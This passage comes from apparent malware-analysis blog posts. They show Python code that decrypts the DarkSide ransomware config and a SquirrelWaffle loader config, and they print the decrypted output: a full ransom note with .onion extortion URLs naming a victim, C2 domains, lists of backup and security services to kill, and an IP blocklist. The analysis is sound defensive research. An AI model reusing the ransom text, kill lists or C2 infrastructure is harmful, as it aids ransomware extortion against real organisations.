Decryption . The config is stored in the data or ndata section of the PE file. The first two 16-byte blocks are the components of the key buffer. Following the key material is a DWORD that indicates the size of the encrypted config. This is followed by the encrypted config itself. . The actual config decryption process is as follows. . Find the data section | Locate the size of the config at offset 0x20 | Extract the encrypted config | Decrypt config using the custom decryption algorithm | Decompress the resulting data using aplib | . import pefile import struct RANSOMWARE_FILE = r&#39;/tmp/darkside.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get section with config section_data = None for s in pe.sections: if b&#39;ndata&#39; in s.Name: section_data = s.get_data() break # Extract config config_length = struct.unpack(&#39;&lt;I&#39;,section_data[0x20:0x24])[0] enc_data = section_data[0x24:0x24+config_length] # Decrypt config ap_data = decrypt_large_data(enc_data, KEY_BUFFER) # Decompress config data with aplib ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#34; x01 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xef&amp;u&gt; x87 x15 xd8( xb1 xf3A xef xb1 xc9 xd3 xdbw xd2 x08 xad x1c/ xaa xd0, xf4 xc7 xbc&lt;s x89k xd9 x88!s xe31 xbe xd4 xcb}W x9d; xf5 xacnt xe5O x07gBe xed xc5 xc8 x1f xe5 x90 x8e xa4 xdeb * xe9 xac x90 x8d x03 xb3 x13 xc1 x9d* xb2 xb1]W x19 x08W x0fa x0e L xd8 xe2 xd2 t x11 x14Oo xf2 xd8a xca xc4 xa1 x81` xdb x15 x916 n xf5W xbc xc2 xe8 xb9D x13_j}Q xda x802 x90:u0607b8382472634 x00 xd0 x90 xe4 x95o xe6,&#39; x19VG x14wXCy x02 x01 x00 x01 x01 x01 x01 x01 x00 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x02 x010 x00 x00 x00 xdd x02 x00 x00. x04 x00 x00 xb7 x06 x00 x00 xd0 x06 x00 x00 xf1 x06 x00 x00 xb6 x07 x00 x00 x8b n x00 x00d x0b x00 x00 x00 x00 x00 x00 xb5 x0b x00 x00 xbe x0c x00 x00JAByAGUAYwB5AGMAbABlAC4AYgBpAG4AAABjAG8AbgBmAGkAZwAuAG0AcwBpAAAAJAB3AGkAbgBkAG8AdwBzAC4AfgBiAHQAAAAkAHcAaQBuAGQAbwB3AHMALgB+AHcAcwAAAHcAaQBuAGQAbwB3AHMAAABhAHAAcABkAGEAdABhAAAAYQBwAHAAbABpAGMAYQB0AGkAbwBuACAAZABhAHQAYQAAAGIAbwBvAHQAAABnAG8AbwBnAGwAZQAAAG0AbwB6AGkAbABsAGEAAABwAHIAbwBnAHIAYQBtACAAZgBpAGwAZQBzAAAAcAByAG8AZwByAGEAbQAgAGYAaQBsAGUAcwAgACgAeAA4ADYAKQAAAHAAcgBvAGcAcgBhAG0AZABhAHQAYQAAAHMAeQBzAHQAZQBtACAAdgBvAGwAdQBtAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAB0AG8AcgAgAGIAcgBvAHcAcwBlAHIAAAB3AGkAbgBkAG8AdwBzAC4AbwBsAGQAAABpAG4AdABlAGwAAABtAHMAbwBjAGEAYwBoAGUAAABwAGUAcgBmAGwAbwBnAHMAAAB4ADYANABkAGIAZwAAAHAAdQBiAGwAaQBjAAAAYQBsAGwAIAB1AHMAZQByAHMAAABkAGUAZgBhAHUAbAB0AAAAAAB= x00YQB1AHQAbwByAHUAbgAuAGkAbgBmAAAAYgBvAG8AdAAuAGkAbgBpAAAAYgBvAG8AdABmAG8AbgB0AC4AYgBpAG4AAABiAG8AbwB0AHMAZQBjAHQALgBiAGEAawAAAGQAZQBzAGsAdABvAHAALgBpAG4AaQAAAGkAYwBvAG4AYwBhAGMAaABlAC4AZABiAAAAbgB0AGwAZAByAAAAbgB0AHUAcwBlAHIALgBkAGEAdAAAAG4AdAB1AHMAZQByAC4AZABhAHQALgBsAG8AZwAAAG4AdAB1AHMAZQByAC4AaQBuAGkAAAB0AGgAdQBtAGIAcwAuAGQAYgAAAAAA x00MwA4ADYAAABhAGQAdgAAAGEAbgBpAAAAYgBhAHQAAABiAGkAbgAAAGMAYQBiAAAAYwBtAGQAAABjAG8AbQAAAGMAcABsAAAAYwB1AHIAAABkAGUAcwBrAHQAaABlAG0AZQBwAGEAYwBrAAAAZABpAGEAZwBjAGEAYgAAAGQAaQBhAGcAYwBmAGcAAABkAGkAYQBnAHAAawBnAAAAZABsAGwAAABkAHIAdgAAAGUAeABlAAAAaABsAHAAAABpAGMAbAAAAGkAYwBuAHMAAABpAGMAbwAAAGkAYwBzAAAAaQBkAHgAAABsAGQAZgAAAGwAbgBrAAAAbQBvAGQAAABtAHAAYQAAAG0AcwBjAAAAbQBzAHAAAABtAHMAcwB0AHkAbABlAHMAAABtAHMAdQAAAG4AbABzAAAAbgBvAG0AZQBkAGkAYQAAAG8AYwB4AAAAcAByAGYAAABwAHMAMQAAAHIAbwBtAAAAcgB0AHAAAABzAGMAcgAAAHMAaABzAAAAcwBwAGwAAABzAHkAcwAAAHQAaABlAG0AZQAAAHQAaABlAG0AZQBwAGEAYwBrAAAAdwBwAHgAAABsAG8AYwBrAAAAawBlAHkAAABoAHQAYQAAAG0AcwBpAAAAcABkAGIAAAAAAH== x00YgBhAGMAawB1AHAAAAAAAC== x00cwBxAGwAAABzAHEAbABpAHQAZQAAAAAA x00dgBtAGMAbwBtAHAAdQB0AGUALgBlAHgAZQAAAHYAbQBtAHMALgBlAHgAZQAAAHYAbQB3AHAALgBlAHgAZQAAAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAAAFQAZQBhAG0AVgBpAGUAdwBlAHIALgBlAHgAZQAAAGUAeABwAGwAbwByAGUAcgAuAGUAeABlAAAAAAB= x00cwBxAGwAAABvAHIAYQBjAGwAZQAAAG8AYwBzAHMAZAAAAGQAYgBzAG4AbQBwAAAAcwB5AG4AYwB0AGkAbQBlAAAAYQBnAG4AdABzAHYAYwAAAGkAcwBxAGwAcABsAHUAcwBzAHYAYwAAAHgAZgBzAHMAdgBjAGMAbwBuAAAAbQB5AGQAZQBzAGsAdABvAHAAcwBlAHIAdgBpAGMAZQAAAG8AYwBhAHUAdABvAHUAcABkAHMAAABlAG4AYwBzAHYAYwAAAGYAaQByAGUAZgBvAHgAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABtAHkAZABlAHMAawB0AG8AcABxAG8AcwAAAG8AYwBvAG0AbQAAAGQAYgBlAG4AZwA1ADAAAABzAHEAYgBjAG8AcgBlAHMAZQByAHYAaQBjAGUAAABlAHgAYwBlAGwAAABpAG4AZgBvAHAAYQB0AGgAAABtAHMAYQBjAGMAZQBzAHMAAABtAHMAcAB1AGIAAABvAG4AZQBuAG8AdABlAAAAbwB1AHQAbABvAG8AawAAAHAAbwB3AGUAcgBwAG4AdAAAAHMAdABlAGEAbQAAAHQAaABlAGIAYQB0AAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAdgBpAHMAaQBvAAAAdwBpAG4AdwBvAHIAZAAAAHcAbwByAGQAcABhAGQAAABuAG8AdABlAHAAYQBkAAAAAAA= x00dgBzAHMAAABzAHEAbAAAAHMAdgBjACQAAABtAGUAbQB0AGEAcwAAAG0AZQBwAG8AYwBzAAAAcwBvAHAAaABvAHMAAAB2AGUAZQBhAG0AAABiAGEAYwBrAHUAcAAAAEcAeABWAHMAcwAAAEcAeABCAGwAcgAAAEcAeABGAFcARAAAAEcAeABDAFYARAAAAEcAeABDAEkATQBnAHIAAAAAAH== x00YgBhAHIAbwBxAHUAZQB0AGUAZQBzAC4AYwBvAG0AAAByAHUAbQBhAGgAcwBpAGEALgBjAG8AbQAAAAAA x00VwBlAGwAYwBvAG0AZQAgAHQAbwAgAEQAYQByAGsAUwBpAGQAZQAhACAADQAKACAAIAANAAoAIABBAGwAbAAgAFkAbwB1AHIAIABGAGkAbABlAHMAIABBAHIAZQAgAEUAbgBjAHIAeQBwAHQAZQBkACEAIAANAAoAIAAgAA0ACgAgAEYAaQBuAGQAIAAlAHMAIABBAG4AZAAgAEYAbwBsAGwAbwB3ACAASQBuAHMAdAByAHUAYwB0AGkAbwBuAHMAIQAAAAAA x00LS0tLS0tLS0tLS0gWyBXZWxjb21lIHRvIERhcmtTaWRlIF0gLS0tLS0tLS0tLS0tLT4gDQogIA0KIFdoYXQgaGFwcGVuZD8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBZb3VyIGNvbXB1dGVycyBhbmQgc2VydmVycyBhcmUgZW5jcnlwdGVkLCBiYWNrdXBzIGFyZSBkZWxldGVkLiBXZSB1c2Ugc3Ryb25nIGVuY3J5cHRpb24gYWxnb3JpdGhtcywgc28geW91IGNhbm5vdCBkZWNyeXB0IHlvdXIgZGF0YS4gDQogQnV0IHlvdSBjYW4gcmVzdG9yZSBldmVyeXRoaW5nIGJ5IHB1cmNoYXNpbmcgYSBzcGVjaWFsIHByb2dyYW0gZnJvbSB1cyAtIHVuaXZlcnNhbCBkZWNyeXB0b3IuIFRoaXMgcHJvZ3JhbSB3aWxsIHJlc3RvcmUgYWxsIHlvdXIgbmV0d29yay4gDQogRm9sbG93IG91ciBpbnN0cnVjdGlvbnMgYmVsb3cgYW5kIHlvdSB3aWxsIHJlY292ZXIgYWxsIHlvdXIgZGF0YS4gDQogIA0KIERhdGEgbGVhayANCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIA0KIEZpcnN0IG9mIGFsbCB3ZSBoYXZlIGRvd25sb2FkZWQgbW9yZSB0aGVuIDUwMEdCIGRhdGEgZnJvbSB5b3VyIG5ldHdvcmsuIA0KICANCiBJbmNsdWRlZDogDQogLUFjY291bnRpbmcgZGF0YSANCiAtRmluYW5jZSBkYXRhIA0KIC1IUiANCiAtRW1wbG95ZWVzIGNvbmZpZGVudGlhbCBkYXRhKHBob3RvcywgYmVuZWZpdHMsIHRheGVzLCBldGMpIA0KIC1NYXJrZXRpbmcgDQogLUJ1ZGdldHMgDQogLVRheGVzKHNhbGVzIHRheCBjb21wbGlhbmNlLCBwcm9wZXJ0eSwgaW5jb21lIGFuZCBmcmFuY2hpc2UgdGF4ZXMsIGV0YykgDQogLVBheXJvbGxzIA0KIC1CYW5raW5nIGRhdGEgDQogLUFyYml0cmF0aW9uIA0KIC1TY2FucyANCiAtSW5zdXJhbmNlIA0KIC1SZWNvbmNpbGlhdGlvbnMgDQogLVJlcG9ydHMobW9udGhseSBiYW5rIGludmVudG9yeSwgbW9udGhseSBmaW5hbmNpYWwsIGNsYWltcyByZXBvcnRzLCBldGMpIA0KIC1BdWRpdHMoREhHLCBpbnN1cmFuY2UgYXVkaXRzLCBldGMpIA0KIC1CMkIgY2xpZW50cyBjb25maWcgZGF0YSANCiAtQ29uZmlkZW50aWFsaXR5IDIwMjAgDQogLTIwMjAsIDIwMjEgQnVzaW5lc3MgcGxhbnMgDQogLTIwMTksIDIwMjAsIDIwMjEgeWVhcnMgQ2xvc2luZyAoZnVsbCBkdW1wcykgDQogLWFuZCBhIGxvdCBvZiBvdGhlciBzZW5zaXRpdmUgZGF0YSANCiAgDQogWW91ciBwZXJzb25hbCBsZWFrIHBhZ2U6IGh0dHA6Ly9kYXJrc2lkYzNpdXg0NjJuNnl1bmV2b2FnNTJudHZ3cDZ3dWxhejN6aXJrbWg0Y256NmhoajdpZC5vbmlvbi8xNjIvdGhlZGl4aWVncm91cC9MQ2Z5SFJjd2ZmcllUYmxwWnZvUE8zWERicllQY051MHdWQXNINXA0OUxTakJmelRtdGRYVDQ4YXpYRmxNdTdxIA0KIE9uIHRoZSBwYWdlIHlvdSB3aWxsIGZpbmQgZXhhbXBsZXMgb2YgZmlsZXMgdGhhdCBoYXZlIGJlZW4gZG93bmxvYWRlZC4gDQogVGhlIGRhdGEgaXMgcHJlbG9hZGVkIGFuZCB3aWxsIGJlIGF1dG9tYXRpY2FsbHkgcHVibGlzaGVkIGlmIHlvdSBkbyBub3QgcGF5LiANCiBBZnRlciBwdWJsaWNhdGlvbiwgeW91ciBkYXRhIHdpbGwgYmUgYXZhaWxhYmxlIGZvciBhdCBsZWFzdCA2IG1vbnRocyBvbiBvdXIgdG9yIGNkbiBzZXJ2ZXJzLiANCiAgDQogV2UgYXJlIHJlYWR5OiANCiAtIFRvIHByb3ZpZGUgeW91IHRoZSBldmlkZW5jZSBvZiBzdG9sZW4gZGF0YSANCiAtIFRvIGRlbGV0ZSBhbGwgdGhlIHN0b2xlbiBkYXRhLiANCiAgDQogIA0KIFdoYXQgZ3VhcmFudGVlcz8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBXZSB2YWx1ZSBvdXIgcmVwdXRhdGlvbi4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcywgbm9ib2R5IHdpbGwgcGF5IHVzLiBUaGlzIGlzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLiANCiBBbGwgb3VyIGRlY3J5cHRpb24gc29mdHdhcmUgaXMgcGVyZmVjdGx5IHRlc3RlZCBhbmQgd2lsbCBkZWNyeXB0IHlvdXIgZGF0YS4gV2Ugd2lsbCBhbHNvIHByb3ZpZGUgc3VwcG9ydCBpbiBjYXNlIG9mIHByb2JsZW1zLiANCiBXZSBndWFyYW50ZWUgdG8gZGVjcnlwdCBvbmUgZmlsZSBmb3IgZnJlZS4gR28gdG8gdGhlIHNpdGUgYW5kIGNvbnRhY3QgdXMuIA0KICANCiBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyAgDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBVc2luZyBhIFRPUiBicm93c2VyOiANCiAxKSBEb3dubG9hZCBhbmQgaW5zdGFsbCBUT1IgYnJvd3NlciBmcm9tIHRoaXMgc2l0ZTogaHR0cHM6Ly90b3Jwcm9qZWN0Lm9yZy8gDQogMikgT3BlbiBvdXIgd2Vic2l0ZTogaHR0cDovL2RhcmsyNHp6MzZ4bTR5MnBod2U3eXZua2tra2h4aW9uaGZyd3A2N2F3cGIzcjNiZGNuZWl2b3FkLm9uaW9uL1c1N01SSTlDN1laSlVaRUFCQkJZUlFMU1VURzIySlo5TUFIMFdUMUlTSEM0MDVLUDdaMlVXWTNBSTNKNjhETk0gDQogIA0KIFdoZW4geW91IG9wZW4gb3VyIHdlYnNpdGUsIHB1dCB0aGUgZm9sbG93aW5nIGRhdGEgaW4gdGhlIGlucHV0IGZvcm06IA0KIEtleTogDQogIA0KIHVnOGxncFgzV3JGemxFSjZIQldsd0puZjdqZW1oZm5seEJ3OXBvcmoxdXVZRlRnS2J4SlFKTFlpdGVRUzdEd2dabjdkSDBmczdxUFBXbVo2aW5QdjVHVG1TSlpOQWpHTFZJamQ0U29peVRkR3lvcGhmMHpQQnh4NnVFQU9KeE0wV29vNFpHZUtWb1VESHRac3FaTm5oTUY3YVBoNTRWbktwSUpYaVpEYlpadzRQMDZ4VHV3MVVNZWlURTd3ZGc3SFdaTWVwQVZUekVJMlcwNFJia1BGUUhmVWdFRGNzbER4YnI4M0J2b3BZVFlHS0ZSbXROVU1IOE9zT1pRck90djUweFdEYU9mYnF4YnpmSE1KbTMwUUdhR3BneWxKSFFac3NjejNYQm53SWR2bHdCSjlLTjREVmdGZ3ppUmR2d0pyZkNQNllOMUNZVE9RZ3cxcnpxbUlVNEcxeEdZdjdyRTNqaUJZMXM0RDNZMjZTYnBwVGNlQVZNdTFtS3g1Q0ZJRTNFYnRjQXNOdEVxTEhEYlBuTUN2VTZBcHdwMTdUWEdvYjh4WEpwRURCWmhJemRUYUN1eWJjcHJ3Y0ZOVE96Y2NqYklIODFXMzlNcmNKaTltTk8za0hSZTVmeG1JRkt2Yzl2OGFRRGloR3lDNjVEdGRhYnlCamlkWEkxTnlOT05UNFBUeXJ4WXFnZmZQc05ERnV6ejJ5TXJYaVRBd3RBUVBxbnk1QkJKUXNmVmhwTFhUdG5MdldnMSANCiAgDQogISEhIERBTkdFUiAhISEgDQogRE8gTk9UIE1PRElGWSBvciB0cnkgdG8gUkVDT1ZFUiBhbnkgZmlsZXMgeW91cnNlbGYuIFdlIFdJTEwgTk9UIGJlIGFibGUgdG8gUkVTVE9SRSB0aGVtLiAgDQogISEhIERBTkdFUiAhISE=&#34; . Parsing The Config . The first 128 bytes of the config are the RSA exponent followed by the 128 bytes RSA modulus. . After the modulus is a 32 buffer containing a null terminated ascii string representing the affiliate ID followed by some random data. . Next is a 22 bytes buffer containing a series of binary configuration flags. . Next is a DWORD indicating where the start of the next configuration value. . The following config values are base64 encoded and seperated by null bytes. . import base64 ptr = 0 rsa_exponent = ptxt_data[ptr:128] ptr += 128 rsa_mod = ptxt_data[ptr:ptr+128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] affiliate_id = affiliate_id_data.split(b&#39; x00&#39;)[0] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 22 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c).split(b&#39; x00 x00&#39;)) . Print Config Values . print(&quot;Affiliate ID: %s n&quot; % affiliate_id) for c in config_values: print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c])) . Affiliate ID: b&#39;0607b8382472634&#39; b&#39;$recycle.bin | config.msi | $windows.~bt | $windows.~ws | windows | appdata | application data | boot | google | mozilla | program files | program files (x86) | programdata | system volume information | tor browser | windows.old | intel | msocache | perflogs | x64dbg | public | all users | default | | &#39; b&#39;autorun.inf | boot.ini | bootfont.bin | bootsect.bak | desktop.ini | iconcache.db | ntldr | ntuser.dat | ntuser.dat.log | ntuser.ini | thumbs.db | | &#39; b&#39;386 | adv | ani | bat | bin | cab | cmd | com | cpl | cur | deskthemepack | diagcab | diagcfg | diagpkg | dll | drv | exe | hlp | icl | icns | ico | ics | idx | ldf | lnk | mod | mpa | msc | msp | msstyles | msu | nls | nomedia | ocx | prf | ps1 | rom | rtp | scr | shs | spl | sys | theme | themepack | wpx | lock | key | hta | msi | pdb | | &#39; b&#39;backup | | &#39; b&#39;sql | sqlite | | &#39; b&#39;vmcompute.exe | vmms.exe | vmwp.exe | svchost.exe | TeamViewer.exe | explorer.exe | | &#39; b&#39;sql | oracle | ocssd | dbsnmp | synctime | agntsvc | isqlplussvc | xfssvccon | mydesktopservice | ocautoupds | encsvc | firefox | tbirdconfig | mydesktopqos | ocomm | dbeng50 | sqbcoreservice | excel | infopath | msaccess | mspub | onenote | outlook | powerpnt | steam | thebat | thunderbird | visio | winword | wordpad | notepad | | &#39; b&#39;vss | sql | svc$ | memtas | mepocs | sophos | veeam | backup | GxVss | GxBlr | GxFWD | GxCVD | GxCIMgr | | &#39; b&#39;baroquetees.com | rumahsia.com | | &#39; b&#39;Welcome to DarkSide! r n r n All Your Files Are Encrypted! r n r n Find %s And Follow Instructions! | | &#39; b&#39;-- [ Welcome to DarkSide ] -&gt; r n r n What happend? r n - r n Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. r n But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network. r n Follow our instructions below and you will recover all your data. r n r n Data leak r n - r n First of all we have downloaded more then 500GB data from your network. r n r n Included: r n -Accounting data r n -Finance data r n -HR r n -Employees confidential data(photos, benefits, taxes, etc) r n -Marketing r n -Budgets r n -Taxes(sales tax compliance, property, income and franchise taxes, etc) r n -Payrolls r n -Banking data r n -Arbitration r n -Scans r n -Insurance r n -Reconciliations r n -Reports(monthly bank inventory, monthly financial, claims reports, etc) r n -Audits(DHG, insurance audits, etc) r n -B2B clients config data r n -Confidentiality 2020 r n -2020, 2021 Business plans r n -2019, 2020, 2021 years Closing (full dumps) r n -and a lot of other sensitive data r n r n Your personal leak page: http://darksidc3iux462n6yunevoag52ntvwp6wulaz3zirkmh4cnz6hhj7id.onion/162/thedixiegroup/LCfyHRcwffrYTblpZvoPO3XDbrYPcNu0wVAsH5p49LSjBfzTmtdXT48azXFlMu7q r n On the page you will find examples of files that have been downloaded. r n The data is preloaded and will be automatically published if you do not pay. r n After publication, your data will be available for at least 6 months on our tor cdn servers. r n r n We are ready: r n - To provide you the evidence of stolen data r n - To delete all the stolen data. r n r n r n What guarantees? r n - r n We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests. r n All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems. r n We guarantee to decrypt one file for free. Go to the site and contact us. r n r n How to get access on website? r n - r n Using a TOR browser: r n 1) Download and install TOR browser from this site: https://torproject.org/ r n 2) Open our website: http://dark24zz36xm4y2phwe7yvnkkkkhxionhfrwp67awpb3r3bdcneivoqd.onion/W57MRI9C7YZJUZEABBBYRQLSUTG22JZ9MAH0WT1ISHC405KP7Z2UWY3AI3J68DNM r n r n When you open our website, put the following data in the input form: r n Key: r n r n ug8lgpX3WrFzlEJ6HBWlwJnf7jemhfnlxBw9porj1uuYFTgKbxJQJLYiteQS7DwgZn7dH0fs7qPPWmZ6inPv5GTmSJZNAjGLVIjd4SoiyTdGyophf0zPBxx6uEAOJxM0Woo4ZGeKVoUDHtZsqZNnhMF7aPh54VnKpIJXiZDbZZw4P06xTuw1UMeiTE7wdg7HWZMepAVTzEI2W04RbkPFQHfUgEDcslDxbr83BvopYTYGKFRmtNUMH8OsOZQrOtv50xWDaOfbqxbzfHMJm30QGaGpgylJHQZsscz3XBnwIdvlwBJ9KN4DVgFgziRdvwJrfCP6YN1CYTOQgw1rzqmIU4G1xGYv7rE3jiBY1s4D3Y26SbppTceAVMu1mKx5CFIE3EbtcAsNtEqLHDbPnMCvU6Apwp17TXGob8xXJpEDBZhIzdTaCuybcprwcFNTOzccjbIH81W39MrcJi9mNO3kHRe5fxmIFKvc9v8aQDihGyC65DtdabyBjidXI1NyNONT4PTyrxYqgffPsNDFuzz2yMrXiTAwtAQPqny5BBJQsfVhpLXTtnLvWg1 r n r n !!! DANGER !!! r n DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. r n !!! DANGER !!!&#39; .",
            "url": "https://research.openanalysis.net/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "relUrl": "/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "date": " • Oct 8, 2021"
        }
        
    
  
    
        ,"post14": {
            "title": "SquirrelWaffel Config Extraction",
            "content": "Overview . Notes from our live stream where we reverse engineered the squirrelwaffle loader and built a static config extractor for it. . References . Malware Traffic Analysis Sample 1 | Malware Traffic Analysis Sample 2 | Unpacked Sample (malshare) | . Setup . Make sure you have pefile installed pip install pefile and you change the SAMPLE_PATH to the squirrelwaffle sample you have downloaded. . import pefile . SAMPLE_PATH = r&#39;/tmp/squirrel.bin&#39; data = open(SAMPLE_PATH,&#39;rb&#39;).read() . Extract the .rdata section . The .rdata section has the encrypted data and the decryption keys so let&#39;s grab that first. . pe = pefile.PE(data=data) rdata = None for s in pe.sections: if b&#39;.rdata&#39; in s.Name: rdata = s.get_data() len(rdata) . 20480 . Parse .rdata . The encrypted strings in the .rdata section are followed by their key and all data, keys, and strings are seperated by null bytes. We can parse out the data and key by splitting the .rdata on null bytes then looking for the largest blocks of data. These are likely the encrypted blocklist and the encrypted c2 list. . We want to maintain two lists of data blocks, one sorted and one original order. This way we can use the sorted list to get the largest blocks, and the original order list to find the key which is sequentially after the encrypted data. . blocks = rdata.split(b&#39; x00&#39;) blocks = [x for x in blocks if x != b&#39;&#39;] blocks_sorted = sorted(blocks, key=len) . Decryption function . The config decryption is a simple xor so we want to replicate this in python . def decrypt(key, data): out = &#39;&#39; for i in range(len(data)): out += chr(data[i] ^ key[i % len(key)]) return out . Decrypt the blocklist . The largest encrupted block is likely the blocklist so let&#39;s decrypt that first. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-1]: out = decrypt(blocks[i+1], blocks[i]) print(out) . 94.46.179.80 206.189.205.251 88.242.66.45 85.75.110.214 87.104.3.136 207.244.91.171 49.230.88.160 91.149.252.75 91.149.252.88 92.211.109.152 178.0.250.168 88.69.16.230 95.223.77.160 99.234.62.23 2.206.105.223 84.222.8.201 89.183.239.142 5.146.132.101 77.7.60.154 45.41.106.122 45.74.72.13 74.58.152.123 88.87.68.197 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 185.220.100.249 37.71.173.58 93.2.220.100 188.10.191.109 81.36.17.247 70.28.47.118 45.133.172.222 108.41.227.196 37.235.53.46 162.216.47.22 154.3.42.51 45.86.200.60 212.230.181.152 185.192.70.11 37.142.65.69 87.166.51.31 178.198.76.175 128.90.172.136 172.58.227.224 201.77.112.133 64.124.12.162 87.166.51.28 104.244.72.115 109.70.100.23 192.145.127.220 194.186.142.122 185.207.249.217 52.250.42.144 45.86.201.156 195.245.199.125 213.33.190.70 154.61.71.13 154.13.1.22 191.96.185.151 40.94.25.22 40.94.25.39 40.94.25.5 40.94.25.79 40.94.25.69 40.94.25.71 40.94.25.60 40.94.25.64 40.94.25.29 40.94.25.23 40.94.25.89 40.94.26.165 40.94.26.210 40.94.26.208 40.94.26.166 40.94.26.216 40.94.26.173 40.94.26.182 40.94.35.75 40.94.35.97 40.94.35.27 40.94.35.38 40.94.35.46 40.94.35.76 40.94.35.70 40.94.35.80 40.94.35.98 40.94.35.40 45.86.200.23 198.167.212.98 40.94.31.87 40.94.31.85 40.94.31.29 40.94.31.97 40.94.31.88 40.94.31.80 40.94.31.65 198.167.195.112 40.94.31.58 40.94.31.48 40.94.31.64 40.94.31.26 40.94.31.66 40.94.31.90 40.94.31.46 40.94.31.47 212.119.227.184 72.12.194.93 72.12.194.94 72.12.194.92 134.209.213.55 35.198.84.59 89.208.29.2 40.94.30.159 40.94.30.139 40.94.30.152 40.94.30.167 40.94.30.164 40.94.30.166 40.94.30.174 40.94.30.151 154.61.71.53 40.94.30.157 40.94.30.136 40.94.30.149 52.154.162.74 213.33.190.161 83.84.25.214 162.251.62.154 188.241.177.152 92.211.110.221 154.61.71.51 185.183.107.236 72.12.194.90 40.94.25.36 40.94.29.4 40.94.25.50 40.94.29.31 40.94.25.31 40.94.29.41 40.94.31.5 40.94.25.80 40.94.29.82 40.94.31.81 40.94.25.96 40.94.29.59 40.94.31.3 40.94.25.58 40.94.31.61 40.94.31.49 40.94.31.54 40.94.31.62 40.94.31.70 40.94.30.211 40.94.30.148 40.94.30.218 40.94.30.147 40.94.30.129 40.94.31.15 40.94.30.169 40.94.31.36 40.94.30.223 40.94.30.203 95.211.36.179 64.233.172.102 153.246.206.71 198.167.193.35 90.187.12.209 37.49.116.179 52.167.22.240 160.177.96.15 185.123.143.220 167.99.172.253 40.94.36.81 86.107.21.203 24.37.31.38 71.19.154.84 34.142.74.220 192.160.102.170 216.251.130.74 49.44.76.43 109.147.65.157 86.217.130.91 178.174.15.54 86.242.244.97 92.46.70.105 81.201.234.26 78.94.217.60 141.226.236.91 95.26.228.102 89.208.29.3 213.33.190.205 213.33.190.121 5.154.174.45 23.154.177.3 195.65.152.138 93.231.174.227 185.220.101.132 54.36.101.21 72.12.194.91 46.14.116.174 141.19.232.57 185.220.101.149 45.74.46.69 157.230.210.133 82.199.130.36 104.237.193.28 187.46.138.56 195.164.49.162 156.146.49.135 195.164.49.191 79.104.209.54 35.245.134.90 20.52.139.186 189.139.144.151 94.31.102.187 39.43.45.71 107.189.10.143 39.43.123.57 106.75.76.179 194.186.142.131 210.22.129.194 45.130.83.77 154.6.16.175 162.247.73.192 107.189.1.160 185.107.47.215 46.166.139.111 185.56.80.65 185.220.100.245 209.141.59.180 77.247.181.163 185.220.101.137 185.220.100.242 104.244.76.13 185.83.214.69 185.220.100.252 185.112.146.73 185.57.82.28 89.187.171.116 66.220.242.222 39.43.72.17 5.171.90.80 185.152.32.77 23.129.64.157 92.151.9.187 106.75.31.237 122.167.79.251 109.70.100.33 199.249.230.154 64.233.172.108 64.233.172.106 64.233.172.104 77.247.181.165 107.189.12.240 79.142.76.203 193.128.114.34 185.92.26.59 185.65.210.119 70.39.159.79 70.39.159.29 151.48.26.15 151.48.26.15 2.228.159.178 188.174.248.154 188.174.248.154 95.90.198.182 95.90.198.182 193.0.200.36 193.0.200.36 151.127.13.232 89.97.249.158 212.115.152.225 185.217.117.179 199.249.230.164 80.233.134.134 109.74.154.92 65.39.88.250 90.84.192.187 